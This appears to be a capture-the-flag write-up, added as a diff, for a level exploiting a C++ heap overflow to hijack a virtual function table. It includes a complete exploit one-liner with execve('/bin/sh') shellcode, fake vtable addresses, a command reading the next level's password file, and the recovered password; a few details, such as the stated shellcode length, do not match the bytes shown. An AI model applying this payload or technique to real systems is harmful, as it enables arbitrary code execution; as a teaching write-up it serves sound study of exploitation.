@@ -1,0 +1,125 @@
+# Level 9
+
+## Vulnerability
+C++ heap overflow with virtual function table (vtable) hijacking.
+
+## Code Analysis
+```cpp
+class N {
+    void *vtable;           // +0x00: Pointer to virtual function table
+    char annotation[100];   // +0x04: 100-byte buffer
+    int value;              // +0x68: Integer value
+    
+public:
+    N(int val) {
+        vtable = &vtable_N;
+        value = val;
+    }
+    
+    void setAnnotation(char *str) {
+        memcpy(annotation, str, strlen(str));  // NO BOUNDS CHECK!
+    }
+    
+    int operator+(N &other) {
+        return this->value + other.value;
+    }
+};
+
+int main(int argc, char **argv) {
+    if (argc < 2) exit(1);
+    
+    N *obj1 = new N(5);      // Allocate first object
+    N *obj2 = new N(6);      // Allocate second object
+    
+    obj1->setAnnotation(argv[1]);  // OVERFLOW HERE!
+    obj2->operator+(obj1);         // Call virtual function
+}
+```
+
+## Heap Layout
+```
+┌─────────────────┐
+│ obj1            │ ← First object (108 bytes)
+│ [vtable ptr]    │ +0x00
+│ [annotation]    │ +0x04 (100 bytes) ← argv[1] goes here
+│ [value = 5]     │ +0x68
+├─────────────────┤
+│ obj2            │ ← Second object (108 bytes)
+│ [vtable ptr]    │ +0x00 ← We can overwrite this!
+│ [annotation]    │ +0x04
+│ [value = 6]     │ +0x68
+└─────────────────┘
+```
+
+## Exploitation Strategy
+
+1. **Overflow obj1 to overwrite obj2's vtable**
+   - Write shellcode at start of obj1's annotation
+   - Overflow to reach obj2's vtable pointer
+   - Overwrite vtable with address pointing to our shellcode
+
+2. **Fake vtable structure**
+```
+   obj2->vtable → fake_vtable → shellcode address
+   
+   When operator+ is called:
+   call [vtable][0] → jumps to shellcode
+```
+
+## Solution Steps
+
+1. **Calculate offsets**
+   - obj1 annotation: 100 bytes
+   - obj1 value: 4 bytes  
+   - Heap metadata: ~8 bytes
+   - Total to obj2 vtable: ~108 bytes
+
+2. **Payload structure**
+```
+   [fake_vtable_addr] + [shellcode] + [padding] + [fake_vtable_ptr]
+```
+   - Fake vtable at: `0x0804a00c` (obj1 + 8)
+   - Shellcode at: `0x0804a010` (obj1 + 12)
+   - Overwrite obj2 vtable with: `0x0804a00c`
+
+3. **Exploit**
+```bash
+   ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
+```
+   
+   **Payload breakdown:**
+   - `\x10\xa0\x04\x08`: Fake vtable entry (points to shellcode at 0x0804a010)
+   - Shellcode (33 bytes): execve("/bin/sh")
+   - `"A" * 76`: Padding to reach obj2's vtable
+   - `\x0c\xa0\x04\x08`: Overwrites obj2 vtable pointer (points to fake vtable)
+
+4. **Get flag**
+```bash
+   whoami
+   # bonus0
+   cat /home/user/bonus0/.pass
+   # f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
+## Attack Flow
+```
+1. obj1->setAnnotation(payload)
+   ┌─────────────────┐
+   │ obj1            │
+   │ [vtable]        │
+   │ [0x0804a010]    │ ← Fake vtable entry
+   │ [shellcode...]  │ ← Our shellcode
+   │ [AAAA...]       │ ← Overflow padding
+   ├─────────────────┤
+   │ obj2            │
+   │ [0x0804a00c]    │ ← Overwritten vtable pointer
+   └─────────────────┘
+
+2. obj2->operator+(obj1)
+   → Reads vtable: [0x0804a00c]
+   → Reads function pointer: [0x0804a010]
+   → Jumps to shellcode!
+```
+
+## Key Concept
+**Vtable Hijacking**: C++ objects store virtual function pointers in a vtable. By overflowing into the next object's vtable pointer, we redirect virtual function calls to our shellcode. This is a classic C++ exploitation technique.
